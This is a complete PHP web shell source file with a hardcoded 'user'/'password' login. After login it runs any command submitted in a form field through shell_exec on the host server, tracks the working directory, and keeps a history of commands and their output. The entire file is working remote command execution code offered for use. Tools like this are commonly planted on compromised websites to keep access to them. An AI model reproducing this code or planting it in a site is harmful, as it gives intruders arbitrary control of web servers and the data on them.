<?php
/**
 * Web Shell
 *
 * A simple web shell made in PHP.
 *
 * @since 1.0.0
 * @link  https://saku.fun/
 */

ini_set('log_errors', '0');
ini_set('display_errors', '1');
error_reporting(E_ALL);
session_start();

$user   = 'user';
$passwd = 'password';

// Authentication process
if (isset($_POST['user']) && isset($_POST['passwd'])) {
    $_SESSION['webshell_auth'] = md5(trim($_POST['user'] . ':' . $_POST['passwd']));
}

if (empty($_SESSION['webshell_auth'])
    || $_SESSION['webshell_auth'] !== md5($user . ':' . $passwd)) {
    ?>
        <!DOCTYPE html>
        <html lang="ja">
        <head>
            <meta charset="UTF-8">
            <title>Authentication</title>
        </head>
        <body>
        <form method="POST">
            User: <input type="text" name="user"><br>
            Password: <input type="text" name="passwd"><br>
            <input type="submit" value="Login">
        </form>
        </body>
        </html>
    <?php
    exit();
}

// Initialize
if (empty($_SESSION['webshell']['path'])) {
    $_SESSION['webshell']['path'] =  realpath('./');
}
if (empty($_SESSION['webshell']['history'])){
    $_SESSION['webshell']['history'] = '';
}
if (empty($_SESSION['webshell']['sys_user'])) {
    $_SESSION['webshell']['sys_user'] = trim(shell_exec('whoami'));
}

if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);

    // Screen reset.
    if ($cmd === 'clear') {
        $_SESSION['webshell'] = [];

        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

    // Update current directory.
    if (preg_match("/^cd\s/i", $cmd)) {
        $_SESSION['webshell']['history'] .= sprintf(
            '[%s@%s %s] $ %s<br>' . PHP_EOL,
            $_SESSION['webshell']['sys_user'],
            $_SERVER['SERVER_ADDR'],
            $_SESSION['webshell']['path'],
            $cmd
        );
        $cmd_array = explode(' ', $cmd);
        $_SESSION['webshell']['path'] = realpath($_SESSION['webshell']['path'] . '/' . $cmd_array[1]);

        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

    // Command execution and execution result recording.
    $_SESSION['webshell']['history'] .= sprintf(
        '[%s@%s %s] $ %s<br>' . PHP_EOL,
        $_SESSION['webshell']['sys_user'],
        $_SERVER['SERVER_ADDR'],
        $_SESSION['webshell']['path'],
        $cmd
    );
    $exec_cmd = sprintf('cd %s ; %s', $_SESSION['webshell']['path'], $cmd);
    $_resulet = mb_convert_encoding(shell_exec($exec_cmd), 'UTF-8');
    $_SESSION['webshell']['history']
        .= sprintf(
            '<pre>%s</pre>' . PHP_EOL,
            htmlspecialchars($_resulet, ENT_QUOTES, 'UTF-8', true)
        );
}
?>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>WEB SHELL</title>
    <style>
        * {
            color: #c8d8c0;
            font-family: Consolas, 'Courier New', Courier, Monaco, monospace;
            font-size: 14px;
            line-height: 1.2;
        }
        body {
            background-color: #322539;
        }
        input {
            border: none;
            outline: none;
            background-color: transparent;
        }
    </style>
    <script>
        var element = document.documentElement;
        var bottom = element.scrollHeight - element.clientHeight;
        window.scroll(0, bottom);
    </script>
</head>
<body>
<pre>
    ╦ ╦┌─┐┌┐   ╔═╗┬ ┬┌─┐┬  ┬
    ║║║├┤ ├┴┐  ╚═╗├─┤├┤ │  │
    ╚╩╝└─┘└─┘  ╚═╝┴ ┴└─┘┴─┘┴─┘
    *Cannot execute interactive command.
</pre>
    <?php echo $_SESSION['webshell']['history']; ?>
    <form method="POST">
    <?php
        printf(
            '[%s@%s %s] $ ' . PHP_EOL,
            $_SESSION['webshell']['sys_user'],
            $_SERVER['SERVER_ADDR'],
            $_SESSION['webshell']['path']
        );
    ?>
        <input autofocus type="text" name="cmd">
    </form>
</body>
</html>